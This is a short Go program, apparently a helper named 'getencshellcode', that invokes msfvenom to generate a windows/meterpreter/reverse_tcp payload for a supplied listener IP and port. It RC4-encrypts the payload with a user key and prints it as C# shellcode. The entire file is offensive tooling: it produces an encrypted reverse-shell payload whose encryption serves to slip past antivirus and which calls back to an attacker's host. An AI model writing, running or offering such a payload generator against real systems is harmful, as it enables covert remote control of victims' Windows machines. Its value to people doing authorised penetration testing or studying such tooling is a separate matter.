package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
)

func wrapper(ip, port, key string) {
	var revshell string
	cmdvenom := "msfvenom"

	fpath, _ := exec.LookPath(cmdvenom)

	revshell = "windows/meterpreter/reverse_tcp"

	cmdArgs := []string{"-p", revshell, "lhost=" + ip, "lport=" + port, "--encrypt", "rc4", "--encrypt-key", key, "-f", "csharp"}
	cmdmsfvenom := exec.Command(fpath, cmdArgs...)
	out, err := cmdmsfvenom.CombinedOutput()

	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	fmt.Printf("combined out:\n%s\n", string(out))

}
func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage : getencshellcode lhost lport key")
		return
	}
	wrapper(os.Args[1], os.Args[2], os.Args[3])
}
